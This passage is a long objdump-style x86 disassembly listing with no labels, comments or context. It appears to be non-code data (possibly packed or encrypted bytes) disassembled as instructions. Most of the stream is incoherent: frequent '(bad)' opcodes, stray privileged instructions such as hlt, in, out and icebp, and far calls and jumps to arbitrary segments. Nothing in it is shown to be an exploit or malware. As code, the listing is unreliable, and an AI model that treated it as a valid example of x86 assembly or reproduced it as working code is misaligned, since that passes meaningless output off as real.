  41e085:	sub    ebp,DWORD PTR [ecx+0x25aa6d4]
  41e08b:	pop    edi
  41e08c:	(bad)  
  41e08d:	jne    0x41e035
  41e08f:	sbb    al,0x51
  41e091:	stos   BYTE PTR es:[edi],al
  41e092:	sub    bh,BYTE PTR [ecx+edx*8]
  41e095:	shr    BYTE PTR [edi-0x7e873d8b],0x45
  41e09c:	jae    0x41e0f9
  41e09e:	xabort 0xd6
  41e0a1:	mov    dh,0xc
  41e0a3:	mov    ch,0x50
  41e0a5:	sub    ah,ah
  41e0a7:	or     DWORD PTR [esi-0x6c],edx
  41e0aa:	cdq    
  41e0ab:	pop    ecx
  41e0ac:	cdq    
  41e0ad:	adc    DWORD PTR [edx+0x6a],esp
  41e0b0:	div    esp
  41e0b2:	cmp    ebx,esp
  41e0b4:	ss jae 0x41e066
  41e0b7:	sbb    esi,ebp
  41e0b9:	fld    st(3)
  41e0bb:	mov    esp,0xf98cc7dd
  41e0c0:	mov    ch,0xb3
  41e0c2:	inc    ebp
  41e0c3:	cmc    
  41e0c4:	xchg   ebp,eax
  41e0c5:	adc    edi,DWORD PTR [edi]
  41e0c7:	xor    esp,DWORD PTR [edi+0x66b6d91f]
  41e0cd:	daa    
  41e0ce:	jg     0x41e0ae
  41e0d0:	jl     0x41e0cc
  41e0d2:	push   ebp
  41e0d3:	imul   edi,DWORD PTR [edi+0x41fe6cac],0x541008f
  41e0dd:	(bad)  
  41e0de:	popa   
  41e0df:	icebp  
  41e0e0:	pushf  
  41e0e1:	pop    eax
  41e0e2:	sbb    edx,DWORD PTR [ecx-0x7e]
  41e0e5:	mov    BYTE PTR cs:[edi+0x15e68f9b],bh
  41e0ec:	adc    dh,dl
  41e0ee:	leave  
  41e0ef:	scas   eax,DWORD PTR es:[edi]
  41e0f0:	ficomp WORD PTR [esi-0x2c]
  41e0f3:	xor    DWORD PTR [edx-0x26],ebp
  41e0f6:	adc    eax,0xd9a7b13f
  41e0fb:	out    0x24,eax
  41e0fd:	int    0x1b
  41e0ff:	or     esi,ebx
  41e101:	es xchg ebp,eax
  41e103:	int3   
  41e104:	hlt    
  41e105:	xchg   ebp,eax
  41e106:	xchg   esp,eax
  41e107:	outs   dx,DWORD PTR ds:[esi]
  41e108:	xchg   edi,eax
  41e109:	sbb    DWORD PTR [ebp-0x488aa8b2],edi
  41e10f:	push   ds
  41e110:	cmp    DWORD PTR ds:0x25370048,esp
  41e116:	rol    DWORD PTR [esi+0x576b213f],cl
  41e11c:	cmp    DWORD PTR [edi+0x6f7579b0],ecx
  41e122:	cmp    eax,0xac297a4d
  41e127:	jnp    0x41e136
  41e129:	cmp    BYTE PTR [edx+0x75],0xe4
  41e12d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e12e:	cwde   
  41e12f:	inc    esi
  41e130:	and    edx,ecx
  41e132:	outs   dx,BYTE PTR ds:[esi]
  41e133:	push   ds
  41e134:	sbb    DWORD PTR [edi+esi*8+0x2d],edi
  41e138:	test   eax,0x8f335d84
  41e13d:	mov    eax,ds:0xa405af13
  41e142:	ret    
  41e143:	or     BYTE PTR [ebx-0x29],ah
  41e146:	inc    ecx
  41e147:	or     eax,ecx
  41e149:	dec    eax
  41e14a:	aad    0xf1
  41e14c:	pushf  
  41e14d:	mov    BYTE PTR [edi],ah
  41e14f:	dec    ecx
  41e150:	aaa    
  41e151:	cmc    
  41e152:	sbb    ch,al
  41e154:	lea    edi,[edi-0x25]
  41e157:	xchg   DWORD PTR [ecx-0x74],esp
  41e15a:	jns    0x41e118
  41e15c:	sbb    DWORD PTR [esi],ecx
  41e15e:	push   cs
  41e15f:	inc    eax
  41e160:	(bad)  
  41e161:	js     0x41e1c5
  41e163:	sbb    dh,BYTE PTR [edx]
  41e165:	push   ebp
  41e166:	push   edx
  41e167:	jmpw   0x2af5
  41e16b:	adc    al,cl
  41e16d:	(bad)  
  41e16e:	(bad)  
  41e16f:	(bad)  
  41e170:	and    BYTE PTR [esi],cl
  41e172:	jge    0x41e107
  41e174:	push   cs
  41e175:	cwde   
  41e176:	or     ecx,ecx
  41e178:	push   ss
  41e179:	retf   0xf0ca
  41e17c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e17d:	push   0xe392d9b7
  41e182:	dec    ebx
  41e183:	idiv   DWORD PTR [eax+0x222bf0fd]
  41e189:	inc    edx
  41e18a:	cli    
  41e18b:	call   0xa245e037
  41e190:	pop    esi
  41e191:	syscall 
  41e193:	jp     0x41e171
  41e195:	enter  0x9f49,0x2f
  41e199:	js     0x41e143
  41e19b:	outs   dx,DWORD PTR ds:[esi]
  41e19c:	je     0x41e1d6
  41e19e:	push   ds
  41e19f:	ret    0xdc2
  41e1a2:	outs   dx,BYTE PTR ds:[esi]
  41e1a3:	or     BYTE PTR cs:[ebp-0x73],dh
  41e1a7:	push   edx
  41e1a8:	lods   eax,DWORD PTR ds:[esi]
  41e1a9:	mov    eax,0x6869e061
  41e1ae:	or     al,0x71
  41e1b0:	adc    ch,BYTE PTR [esi]
  41e1b2:	xor    DWORD PTR [ebx-0x4d],edx
  41e1b5:	test   BYTE PTR [ecx-0x6c],0xd6
  41e1b9:	mov    ds:0x9532a62,al
  41e1be:	xor    al,0xcc
  41e1c0:	setno  bh
  41e1c3:	cmp    DWORD PTR [esi],edi
  41e1c5:	sub    edi,DWORD PTR [esi+eiz*8+0x31]
  41e1c9:	sbb    ecx,DWORD PTR [esi-0x44]
  41e1cc:	dec    ecx
  41e1cd:	cld    
  41e1ce:	mov    al,0x51
  41e1d0:	jg     0x41e1d3
  41e1d2:	sub    bh,BYTE PTR [edi-0x7296de82]
  41e1d8:	aas    
  41e1d9:	cmc    
  41e1da:	mov    al,ds:0x9fabcfb6
  41e1df:	ins    DWORD PTR es:[edi],dx
  41e1e0:	dec    edi
  41e1e1:	std    
  41e1e2:	xor    al,0xda
  41e1e4:	stos   BYTE PTR es:[edi],al
  41e1e5:	cmp    eax,DWORD PTR [edi+0xc98c6bc]
  41e1eb:	adc    al,0x51
  41e1ed:	dec    edi
  41e1ee:	jp     0x41e1f7
  41e1f0:	(bad)
  41e1f4:	inc    ebp
  41e1f5:	push   cs
  41e1f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1f7:	push   0x5fd61dae
  41e1fc:	or     DWORD PTR [edi],esi
  41e1fe:	cmp    eax,0x980855c2
  41e203:	rol    DWORD PTR [ebx-0x6b44e5f3],1
  41e209:	imul   edx,DWORD PTR [ecx],0xffffff8e
  41e20c:	aad    0x3c
  41e20e:	pop    ebx
  41e20f:	mov    ecx,0xbe8f78f8
  41e214:	pop    ebp
  41e215:	mov    dl,0xf5
  41e217:	cmc    
  41e218:	sub    eax,0xf22ae75c
  41e21d:	lods   eax,DWORD PTR ds:[esi]
  41e21e:	lods   eax,DWORD PTR ds:[esi]
  41e21f:	inc    esi
  41e220:	mov    esp,edi
  41e222:	inc    esp
  41e223:	mov    bh,0x96
  41e225:	lahf   
  41e226:	mov    ds:0xd3187f8,al
  41e22b:	(bad)  
  41e22c:	cli    
  41e22d:	jbe    0x41e238
  41e22f:	fiadd  WORD PTR [si+0x19]
  41e233:	cdq    
  41e234:	js     0x41e20d
  41e236:	pushf  
  41e237:	(bad)  
  41e238:	push   esp
  41e239:	arpl   WORD PTR [eax-0x3d895eb7],bp
  41e23f:	xchg   ebp,eax
  41e240:	inc    edi
  41e241:	test   DWORD PTR [edi+0x375a54c4],edi
  41e247:	out    dx,eax
  41e248:	mov    edi,0x78a642a4
  41e24d:	jne    0x41e26e
  41e24f:	test   DWORD PTR [edi+0x43d8d916],edi
  41e255:	mov    ecx,DWORD PTR [esi-0x6]
  41e258:	cmp    al,0x4f
  41e25a:	jae    0x41e1ea
  41e25c:	inc    edx
  41e25d:	cmp    eax,0x7f78bf6
  41e262:	adc    esp,DWORD PTR [ebx-0x4d]
  41e265:	sub    al,BYTE PTR [esp+ebp*1-0x759346ea]
  41e26c:	lea    ecx,[ebp+0x58]
  41e26f:	aam    0x90
  41e271:	addr16 call 0xcc6:0x4f4569df
  41e279:	jo     0x41e23e
  41e27b:	add    cl,dl
  41e27d:	loopne 0x41e25d
  41e27f:	aaa    
  41e280:	inc    edi
  41e281:	jb     0x41e263
  41e283:	mov    ebp,DWORD PTR [edi+ecx*1-0x799ca3e5]
  41e28a:	pop    es
  41e28b:	jp     0x41e24b
  41e28d:	pop    ds
  41e28e:	rcr    DWORD PTR [ebx+0x3bc8dbb2],0x67
  41e295:	sahf   
  41e296:	cmp    al,0x59
  41e298:	fcmovnb st,st(5)
  41e29a:	es stos DWORD PTR es:[edi],eax
  41e29c:	lods   eax,DWORD PTR ds:[esi]
  41e29d:	push   0x58
  41e29f:	test   BYTE PTR [edx-0x7f965691],dl
  41e2a5:	(bad)  
  41e2a6:	sub    DWORD PTR [edi+0x652e7e16],edx
  41e2ac:	sub    eax,0x7cc73c1e
  41e2b1:	dec    BYTE PTR [edx+0x64]
  41e2b4:	bound  ecx,QWORD PTR [edi+0x32]
  41e2b7:	mov    bl,0xd8
  41e2b9:	adc    dl,BYTE PTR [esp+edi*4]
  41e2bc:	pop    ecx
  41e2bd:	rcl    BYTE PTR [eax-0x6c],0xf3
  41e2c1:	sbb    al,0xf0
  41e2c3:	aam    0x80
  41e2c5:	aam    0xee
  41e2c7:	sbb    BYTE PTR [ecx+0x1d],dh
  41e2ca:	cmp    al,BYTE PTR [ebp+0x76]
  41e2cd:	test   BYTE PTR [edi+0x26],dh
  41e2d0:	aam    0x76
  41e2d2:	ret    
  41e2d3:	jmp    0x5b0a:0x697dc18
  41e2da:	pop    edi
  41e2db:	enter  0x521d,0x83
  41e2df:	aas    
  41e2e0:	xchg   ebx,eax
  41e2e1:	inc    esi
  41e2e2:	mov    bh,0x75
  41e2e4:	mov    dh,0xc6
  41e2e6:	std    
  41e2e7:	cmp    BYTE PTR [edx],bh
  41e2e9:	or     eax,0x4487c917
  41e2ee:	push   ebx
  41e2ef:	imul   edx,DWORD PTR [edi],0xffffffa0
  41e2f2:	loope  0x41e32d
  41e2f4:	sbb    eax,0x288674bc
  41e2f9:	cmp    al,0xb8
  41e2fb:	popf   
  41e2fc:	dec    ebp
  41e2fd:	push   esp
  41e2fe:	leave  
  41e2ff:	xor    esi,DWORD PTR [esi+0x1e]
  41e302:	inc    edi
  41e303:	loop   0x41e34d
  41e305:	neg    BYTE PTR [esi-0x220913c5]
  41e30b:	xor    esi,DWORD PTR [edx-0x3c034ace]
  41e311:	bound  esp,QWORD PTR [eax+ebp*2+0x79]
  41e315:	or     al,0xe9
  41e317:	(bad)  [ebx+0x6a009a4d]
  41e31d:	push   sp
  41e31f:	adc    dh,BYTE PTR [ecx+0x6b]
  41e322:	mov    ch,0x1e
  41e324:	push   esi
  41e325:	cmp    DWORD PTR [ebx],edx
  41e327:	loop   0x41e33a
  41e329:	push   eax
  41e32a:	mov    DWORD PTR [edx],ebx
  41e32c:	xor    eax,0x64abc452
  41e331:	mov    eax,ds:0x2bbdfadb
  41e336:	push   ebp
  41e337:	mov    bh,0xe1
  41e339:	call   0xb3c:0xf1660083
  41e340:	and    DWORD PTR [esi],esi
  41e342:	xchg   DWORD PTR [ebx-0x30],esi
  41e345:	arpl   WORD PTR [esi-0x2317c34],bx
  41e34b:	sbb    cl,BYTE PTR [edx]
  41e34d:	inc    ebp
  41e34e:	pop    esp
  41e34f:	cmp    ah,BYTE PTR [ebp-0x1a]
  41e352:	aas    
  41e353:	fs clc 
  41e355:	and    ebp,ebp
  41e357:	std    
  41e358:	repz sub eax,0x2a96f8c0
  41e35e:	mov    bh,bl
  41e360:	adc    al,0xf3
  41e362:	jb     0x41e390
  41e364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e365:	imul   ebp,DWORD PTR [eax-0x46],0x5b8a4814
  41e36c:	shl    esi,1
  41e36e:	ss (bad) 
  41e370:	out    0xf2,eax
  41e372:	mov    edi,esi
  41e374:	cmc    
  41e375:	inc    ebx
  41e376:	out    0xad,eax
  41e378:	push   eax
  41e379:	arpl   WORD PTR [edi+ebx*1+0x34],cx
  41e37d:	test   eax,0xa4e93873
  41e382:	xor    BYTE PTR [ebx-0xe],bl
  41e385:	popa   
  41e386:	aam    0x54
  41e388:	mov    WORD PTR [ecx],fs
  41e38a:	imul   esi,DWORD PTR [edi+0x7e],0xa039df7f
  41e391:	mov    ecx,ecx
  41e393:	stc    
  41e394:	inc    ebp
  41e395:	add    edx,DWORD PTR [esi+0x75]
  41e398:	xchg   edi,eax
  41e399:	adc    al,0xf0
  41e39b:	(bad)  
  41e39c:	jae    0x41e41b
  41e39e:	daa    
  41e39f:	pop    ebx
  41e3a0:	push   ebp
  41e3a1:	add    ebx,DWORD PTR [edx+eax*4+0x78]
  41e3a5:	mul    BYTE PTR [eax-0x415c1625]
  41e3ab:	add    BYTE PTR [ecx],dh
  41e3ad:	mov    ecx,DWORD PTR [eax-0x28dd41c2]
  41e3b3:	cmp    BYTE PTR [esi-0x47],al
  41e3b6:	inc    edx
  41e3b7:	(bad)  
  41e3b8:	in     al,dx
  41e3b9:	mov    ch,0x36
  41e3bb:	aam    0x21
  41e3bd:	jne    0x41e3f6
  41e3bf:	add    BYTE PTR [edx-0x245a3a1a],dl
  41e3c5:	xlat   BYTE PTR ds:[ebx]
  41e3c6:	sbb    esi,DWORD PTR [ebp-0x4e]
  41e3c9:	(bad)  
  41e3cb:	(bad)  
  41e3cc:	push   esi
  41e3cd:	icebp  
  41e3ce:	fs pop edi
  41e3d0:	call   0x2a11:0x5d28f599
  41e3d7:	xor    esp,edx
  41e3d9:	mov    esi,0x50da3f1e
  41e3de:	pop    esi
  41e3df:	into   
  41e3e0:	lock into 
  41e3e2:	mov    cs,ecx
  41e3e4:	mov    ebp,0xa81f3678
  41e3e9:	ins    DWORD PTR es:[edi],dx
  41e3ea:	jnp    0x41e375
  41e3ec:	mov    DWORD PTR [edi+edx*4],0x29158e89
  41e3f3:	arpl   dx,di
  41e3f5:	jbe    0x41e3bf
  41e3f7:	mov    ebp,gs
  41e3f9:	inc    edi
  41e3fa:	(bad)  
  41e3fb:	loope  0x41e41d
  41e3fd:	dec    edx
  41e3fe:	(bad)  
  41e3ff:	cmp    edx,DWORD PTR [edx+0x74da2bf7]
  41e405:	sti    
  41e406:	ret    0x23ec
  41e409:	ins    DWORD PTR es:[edi],dx
  41e40a:	cmp    dh,BYTE PTR [esi]
  41e40c:	mov    dh,0x9e
  41e40e:	adc    ah,BYTE PTR [ebx-0x79765beb]
  41e414:	jo     0x41e3e8
  41e416:	add    dh,BYTE PTR [edx-0x2a]
  41e419:	xchg   ebp,eax
  41e41a:	cdq    
  41e41b:	enter  0x345,0xba
  41e41f:	jp     0x41e485
  41e421:	xor    al,0x93
  41e423:	(bad)  
  41e424:	dec    ebp
  41e425:	mov    esp,0x381d4756
  41e42a:	cli    
  41e42b:	xor    eax,0x98d771a
  41e430:	mov    esp,0x610f3576
  41e435:	ret    
  41e436:	push   ebx
  41e437:	or     ebp,esi
  41e439:	mov    bl,0xaa
  41e43b:	inc    esi
  41e43c:	mov    cl,BYTE PTR [ebx+0x73771c63]
  41e442:	test   DWORD PTR [ecx],ebx
  41e444:	lgs    ebp,FWORD PTR [ebx]
  41e447:	out    0x58,al
  41e449:	sbb    eax,0x68d9cef4
  41e44e:	mov    edi,0x6f61356a
  41e453:	aam    0x6e
  41e455:	sbb    eax,0xf409b96c
  41e45a:	cmc    
  41e45b:	sbb    BYTE PTR [ecx+0x57],bl
  41e45e:	jecxz  0x41e456
  41e460:	dec    edx
  41e461:	add    bl,BYTE PTR ds:0xcbbe2796
  41e467:	cdq    
  41e468:	sub    edx,DWORD PTR [edi-0x3fb145e5]
  41e46e:	imul   ecx,DWORD PTR [esi-0x6dd80589],0x85a89023
  41e478:	rcl    esp,cl
  41e47a:	scas   eax,DWORD PTR es:[edi]
  41e47b:	mov    eax,ds:0x48258542
  41e480:	xchg   ebx,eax
  41e481:	pop    ss
  41e482:	mov    dh,0x17
  41e484:	rol    DWORD PTR [ebx+ebp*2],cl
  41e487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e488:	fsubp  st(7),st
  41e48a:	sahf   
  41e48b:	mov    dl,0x7e
  41e48d:	xchg   ebp,eax
  41e48e:	mov    DWORD PTR [ebp+0x7920bd82],eax
  41e494:	add    edx,DWORD PTR [ecx-0x5aa5d246]
  41e49a:	xchg   DWORD PTR [eax+0x29],eax
  41e49d:	mov    al,0xf5
  41e49f:	popaw  
  41e4a1:	pop    ebx
  41e4a2:	sub    al,0x73
  41e4a4:	adc    DWORD PTR [esi-0x30cc34d5],0x10
  41e4ab:	add    bh,BYTE PTR [eax+0x5782d6dc]
  41e4b1:	cmp    eax,0xd8499254
  41e4b6:	sbb    al,ch
  41e4b8:	push   esi
  41e4b9:	shl    DWORD PTR [ebp+0x7],cl
  41e4bc:	mov    dl,dh
  41e4be:	push   esp
  41e4bf:	stos   DWORD PTR es:[edi],eax
  41e4c0:	push   esp
  41e4c1:	push   eax
  41e4c2:	sub    dl,ah
  41e4c4:	ja     0x41e51f
  41e4c6:	inc    edx
  41e4c7:	in     al,0x9c
  41e4c9:	cs push edx
  41e4cb:	or     bl,cl
  41e4cd:	fiadd  DWORD PTR [ecx+edx*4-0xf149a17]
  41e4d4:	stos   DWORD PTR es:[edi],eax
  41e4d5:	or     al,0xa2
  41e4d7:	xchg   ebp,eax
  41e4d8:	arpl   si,sp
  41e4da:	cmc    
  41e4db:	gs push 0x30
  41e4de:	inc    eax
  41e4df:	les    eax,FWORD PTR [esi]
  41e4e1:	mov    ds:0xe1282de,al
  41e4e6:	dec    edx
  41e4e7:	mov    al,ds:0x475ec232
  41e4ec:	cwde   
  41e4ed:	leave  
  41e4ee:	int3   
  41e4ef:	mov    cl,0x82
  41e4f1:	repnz cmp eax,0xc51beaea
  41e4f7:	test   DWORD PTR [esi+0x1a4e180a],edi
  41e4fd:	js     0x41e480
  41e4ff:	inc    edx
  41e500:	inc    ebx
  41e501:	ja     0x41e4d4
  41e503:	int    0x3e
  41e505:	rcr    DWORD PTR [eax],1
  41e507:	jecxz  0x41e4f9
  41e509:	imul   ecx,DWORD PTR [eax],0x5af7c615
  41e50f:	mov    al,ds:0xb2dd7dcb
  41e514:	outs   dx,DWORD PTR ds:[esi]
  41e515:	sahf   
  41e516:	icebp  
  41e517:	add    DWORD PTR [ebx-0x56],0x24
  41e51b:	lods   eax,DWORD PTR ds:[esi]
  41e51c:	xor    ecx,DWORD PTR [ecx-0x29]
  41e51f:	inc    edx
  41e520:	add    eax,DWORD PTR [edi+ebp*1]
  41e523:	sub    edx,eax
  41e525:	inc    ebx
  41e526:	sbb    bh,ch
  41e528:	out    dx,al
  41e529:	and    ecx,DWORD PTR [edi+0x72]
  41e52c:	or     al,0x4b
  41e52e:	sub    esi,edi
  41e530:	cwde   
  41e531:	pop    ecx
  41e532:	in     al,0x1f
  41e534:	es push ss
  41e536:	dec    edx
  41e537:	shl    dh,0x5f
  41e53a:	add    DWORD PTR [ebp+eax*2-0x55aa7b6],0x989b9619
  41e545:	in     al,dx
  41e546:	push   esp
  41e547:	loopne 0x41e54d
  41e549:	or     al,0xe0
  41e54b:	jl     0x41e552
  41e54d:	rol    BYTE PTR [esp+eax*2],1
  41e550:	add    DWORD PTR [ecx+0x46c41220],eax
  41e556:	pop    ecx
  41e557:	mov    ebp,0xb7a77808
  41e55c:	mov    dl,0xb0
  41e55e:	rcl    edi,0x80
  41e561:	sub    eax,0x1e5a6133
  41e566:	retf   0x9293
  41e569:	into   
  41e56a:	cs pop esp
  41e56c:	push   ebx
  41e56d:	xor    DWORD PTR [esp+edx*4+0x19],eax
  41e571:	loop   0x41e50c
  41e573:	add    BYTE PTR [edx+0x26],bh
  41e576:	xchg   edx,eax
  41e577:	xor    al,0x65
  41e579:	mov    eax,0xed28e196
  41e57e:	jge    0x41e577
  41e580:	jmp    0xf9758334
  41e585:	jne    0x41e5f0
  41e587:	sub    BYTE PTR [edi+0x7c],bl
  41e58a:	mov    bh,0x31
  41e58c:	out    dx,eax
  41e58d:	push   edi
  41e58e:	gs mov ch,0xef
  41e591:	inc    edi
  41e592:	sub    al,0x80
  41e594:	test   ebx,ebp
  41e596:	ds call 0x63da:0xc1ccf4ee
  41e59e:	ins    DWORD PTR es:[edi],dx
  41e59f:	fld    st(3)
  41e5a1:	push   DWORD PTR [ecx+0x3ee7f8a6]
  41e5a7:	fldcw  WORD PTR [ecx-0x66]
  41e5aa:	push   cs
  41e5ab:	add    al,al
  41e5ad:	jecxz  0x41e617
  41e5af:	jmp    0x9d5a:0x122d2ea0
  41e5b6:	dec    ebx
  41e5b7:	dec    ebx
  41e5b8:	adc    ecx,edi
  41e5ba:	iret   
  41e5bb:	xchg   BYTE PTR [eax],bl
  41e5bd:	push   es
  41e5be:	enter  0x4279,0xbe
  41e5c2:	out    dx,eax
  41e5c3:	pcmpgtd mm6,QWORD PTR [ebx]
  41e5c6:	inc    edi
  41e5c7:	sbb    BYTE PTR [edx-0x7af8909],ch
  41e5cd:	hlt    
  41e5ce:	mov    esp,0x846f3db8
  41e5d3:	push   eax
  41e5d4:	into   
  41e5d5:	mov    dl,0x8d
  41e5d7:	push   esp
  41e5d8:	dec    ebp
  41e5d9:	sbb    edx,DWORD PTR [ebx+ebp*1]
  41e5dc:	mov    eax,0x7903a869
  41e5e1:	pushw  cs
  41e5e3:	sub    DWORD PTR [ebx+edi*8+0x78],edi
  41e5e7:	mov    fs,esp
  41e5e9:	mov    ebx,cs
  41e5eb:	mov    WORD PTR [esi],gs
  41e5ed:	sbb    DWORD PTR [ebp+0x7e58fe85],esp
  41e5f3:	and    al,0xdc
  41e5f5:	mov    ds:0x9bb436fd,eax
  41e5fa:	sbb    eax,esi
  41e5fc:	loop   0x41e5ee
  41e5fe:	jbe    0x41e611
  41e600:	pop    edx
  41e601:	loop   0x41e5c5
  41e603:	xchg   esp,eax
  41e604:	retf   
  41e605:	sahf   
  41e606:	js     0x41e668
  41e608:	sub    edi,DWORD PTR [esi+0x36]
  41e60b:	rsqrtps xmm2,XMMWORD PTR [esi]
  41e60e:	xchg   DWORD PTR [edi+0x3e],edi
  41e611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e612:	rcr    DWORD PTR [edi],1
  41e614:	dec    ebx
  41e615:	xchg   ebp,eax
  41e616:	ror    DWORD PTR [edx+eiz*8+0x6f],1
  41e61a:	ja     0x41e61d
  41e61c:	stos   BYTE PTR es:[edi],al
  41e61d:	push   edi
  41e61e:	mov    WORD PTR [esi+ebp*1],cs
  41e621:	(bad)  [ecx+0x5753c68d]
  41e627:	and    DWORD PTR [ebx],edx
  41e629:	cmp    cl,BYTE PTR [ebp+0x41]
  41e62c:	xchg   edx,eax
  41e62d:	cli    
  41e62e:	fwait
  41e62f:	aas    
  41e630:	jnp    0x41e676
  41e632:	push   esp
  41e633:	shl    DWORD PTR cs:[esi],1
  41e636:	sahf   
  41e637:	mov    edi,0xde1ffc3b
  41e63c:	fwait
  41e63d:	les    esp,FWORD PTR [edx-0x50]
  41e640:	lods   al,BYTE PTR ds:[esi]
  41e641:	xor    bh,al
  41e643:	fidivr DWORD PTR [edi-0x4b]
  41e646:	jmp    0x41e602
  41e648:	in     al,dx
  41e649:	push   ebp
  41e64a:	xchg   edi,eax
  41e64b:	and    BYTE PTR [ecx],bl
  41e64d:	jno    0x41e62e
  41e64f:	leave  
  41e650:	aam    0x4c
  41e652:	iret   
  41e653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e654:	xor    eax,0xc3a47977
  41e659:	dec    edx
  41e65a:	jmp    DWORD PTR [esi+ebx*2+0x40]
  41e65e:	jne    0x41e619
  41e660:	inc    edi
  41e661:	jg     0x41e674
  41e663:	mov    ebp,0x621a31e
  41e668:	popa   
  41e669:	push   ebx
  41e66a:	xor    al,0xe1
  41e66c:	mov    esp,0xaf5fe8f2
  41e671:	pop    ds
  41e672:	aad    0x2
  41e674:	jle    0x41e6b1
  41e676:	cmc    
  41e677:	mov    BYTE PTR [eax-0x4a],0xf4
  41e67b:	loopne 0x41e68c
  41e67d:	push   eax
  41e67e:	mov    eax,ds:0x729e8021
  41e683:	xchg   esi,eax
  41e684:	xchg   bh,dh
  41e686:	mov    ch,0xbc
  41e688:	mov    esp,0xa91ad838
  41e68d:	hlt    
  41e68e:	gs inc esi
  41e690:	dec    edx
  41e691:	mul    ch
  41e693:	test   esi,eax
  41e695:	inc    esi
  41e696:	push   cs
  41e697:	and    ch,dl
  41e699:	pushf  
  41e69a:	xor    al,0x3f
  41e69c:	and    eax,0xa45448c2
  41e6a1:	test   edi,edi
  41e6a3:	add    eax,0xc6fa3cb9
  41e6a8:	add    al,0xb2
  41e6aa:	(bad)  
  41e6ab:	shl    al,cl
  41e6ad:	xor    DWORD PTR [esi],ebx
  41e6af:	jge    0x41e719
  41e6b1:	rol    BYTE PTR [ebp+0x78bd75c2],cl
  41e6b7:	push   esp
  41e6b8:	fwait
  41e6b9:	mov    fs,WORD PTR ds:0x61802ecd
  41e6bf:	xor    DWORD PTR [eax],eax
  41e6c1:	jmp    0xa48e:0x1afb3867
  41e6c8:	ret    
  41e6c9:	hlt    
  41e6ca:	jp     0x41e672
  41e6cc:	imul   ecx,DWORD PTR [ebx+ebp*1],0xffffff9a
  41e6d0:	outs   dx,DWORD PTR ds:[esi]
  41e6d1:	push   ecx
  41e6d2:	cmp    bl,BYTE PTR [edi-0x4a4a749f]
  41e6d8:	shl    al,1
  41e6da:	loopne 0x41e6a5
  41e6dc:	mov    ebp,0xe2128d6b
  41e6e1:	lea    ebx,[ebx-0x2b]
  41e6e4:	call   0x658b:0x54d8ee01
  41e6eb:	pop    ds
  41e6ec:	out    dx,al
  41e6ed:	pop    esp
  41e6ee:	stos   BYTE PTR es:[edi],al
  41e6ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6f0:	xor    ebx,DWORD PTR [edx-0x8]
  41e6f3:	inc    eax
  41e6f4:	push   ebp
  41e6f5:	mov    bl,0x82
  41e6f7:	arpl   ax,sp
  41e6f9:	in     eax,0xe0
  41e6fb:	and    al,0x4a
  41e6fd:	mov    esi,0x1089091e
  41e702:	adc    al,0xec
  41e704:	icebp  
  41e705:	loope  0x41e687
  41e707:	ins    BYTE PTR es:[edi],dx
  41e708:	daa    
  41e709:	dec    ecx
  41e70a:	mov    cl,0xa3
  41e70c:	jns    0x41e71a
  41e70e:	mov    edi,0xaf2f1a4c
  41e713:	ret    
  41e714:	out    0xc5,al
  41e716:	push   cs
  41e717:	mov    ecx,0x2ee827a4
  41e71c:	jns    0x41e6f0
  41e71e:	mov    bl,0x30
  41e720:	pop    esp
  41e721:	std    
  41e722:	cli    
  41e723:	arpl   WORD PTR [edx-0x11c28b59],cx
  41e729:	int    0xb
  41e72b:	xor    BYTE PTR ds:0x7a91f5d9,cl
  41e731:	push   ecx
  41e732:	shl    BYTE PTR [edi-0x8],0x10
  41e736:	jle    0x41e716
  41e738:	push   cs
  41e739:	jae    0x41e6ea
  41e73b:	mov    al,ds:0x7c4ea82b
  41e740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e741:	cdq    
  41e742:	pusha  
  41e743:	xchg   ebx,eax
  41e744:	aad    0x27
  41e746:	or     dh,BYTE PTR [ebp+0x3]
  41e749:	js     0x41e722
  41e74b:	popa   
  41e74c:	sub    ebp,edx
  41e74e:	ret    
  41e74f:	dec    eax
  41e750:	arpl   WORD PTR [ebx+0x20caf5e3],sp
  41e756:	mov    bh,0x8d
  41e758:	sbb    ecx,DWORD PTR [ebp+0x7aaa0a30]
  41e75e:	sub    eax,0xcd9c8cc4
  41e763:	mov    WORD PTR [eax],ss
  41e765:	mov    ebx,DWORD PTR [ecx-0x733cf7e8]
  41e76b:	xor    BYTE PTR [edx],al
  41e76d:	bound  edx,QWORD PTR ds:0xeb945fbc
  41e773:	popa   
  41e774:	shl    DWORD PTR [ecx],1
  41e776:	dec    ebp
  41e777:	lods   eax,DWORD PTR ds:[esi]
  41e778:	(bad)  
  41e779:	jecxz  0x41e74c
  41e77b:	sub    al,0x5f
  41e77d:	sub    BYTE PTR [edx-0x75],dl
  41e780:	ins    DWORD PTR es:[edi],dx
  41e781:	loope  0x41e75a
  41e783:	mov    ah,0xaa
  41e785:	inc    ebp
  41e786:	inc    esp
  41e787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e788:	test   BYTE PTR [eax-0x6f751dd],dl
  41e78e:	adc    ebp,DWORD PTR [eax]
  41e790:	outs   dx,BYTE PTR ds:[esi]
  41e791:	gs dec ebx
  41e793:	int    0x1f
  41e795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e796:	bound  edx,QWORD PTR [ecx]
  41e798:	mov    cl,BYTE PTR [eax]
  41e79a:	and    edx,edi
  41e79c:	shr    DWORD PTR [ebp+0x3666ef1],0x2c
  41e7a3:	test   eax,0x24a91c79
  41e7a8:	daa    
  41e7a9:	jle    0x41e7ab
  41e7ab:	jg     0x41e78d
  41e7ad:	out    0xde,al
  41e7af:	aas    
  41e7b0:	and    BYTE PTR [eax-0x37b7004],0xf3
  41e7b7:	aaa    
  41e7b8:	pop    ss
  41e7b9:	and    BYTE PTR ds:0x5bbbc09f,bh
  41e7bf:	push   eax
  41e7c0:	mov    esi,0x9664b12a
  41e7c5:	xlat   BYTE PTR cs:[ebx]
  41e7c7:	in     al,0x25
  41e7c9:	mov    bh,0xf4
  41e7cb:	aas    
  41e7cc:	bsf    ebp,DWORD PTR [ecx]
  41e7cf:	and    eax,0xfec72a7d
